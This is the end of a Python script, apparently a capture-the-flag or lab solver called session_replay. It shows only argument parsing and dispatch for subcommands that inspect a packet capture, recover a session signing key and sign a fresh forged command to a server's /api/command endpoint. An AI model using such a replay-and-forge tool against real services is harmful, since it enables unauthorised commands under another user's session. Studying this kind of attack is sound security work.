    ins.add_argument("capture", help="path to a pcap/pcapng or a reassembled cleartext HTTP capture")

    sol = sub.add_parser("solve", help="recover + infer + sign one fresh command (key never printed)")
    sol.add_argument("capture", help="path to a pcap/pcapng or a reassembled cleartext HTTP capture")
    sol.add_argument("--command-body", default="", help="the fresh command body to sign (raw/JSON)")
    sol.add_argument("--timestamp", default="", help="timestamp to sign (e.g. the live server_time)")
    sol.add_argument("--method", default="POST")
    sol.add_argument("--path", default="/api/command")
    sol.add_argument("--query", default="")
    sol.add_argument("--session", default=None, help="session id to reuse (default: the only one)")
    sol.add_argument("--json", action="store_true", help="machine-readable output")
    return p


def main(argv: Iterable[str] | None = None) -> int:
    p = build_parser()
    try:
        a = p.parse_args(list(argv) if argv is not None else None)
    except SystemExit as exc:
        return exc.code if isinstance(exc.code, int) else 2
    # Make the top-level header options visible to the subcommand handlers.
    try:
        if a.mode == "inspect":
            return _cmd_inspect(a)
        return _cmd_solve(a)
    except ReplayError as exc:
        print(f"session_replay: {exc}", file=sys.stderr)
        return 1
    except FileNotFoundError as exc:
        print(f"session_replay: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
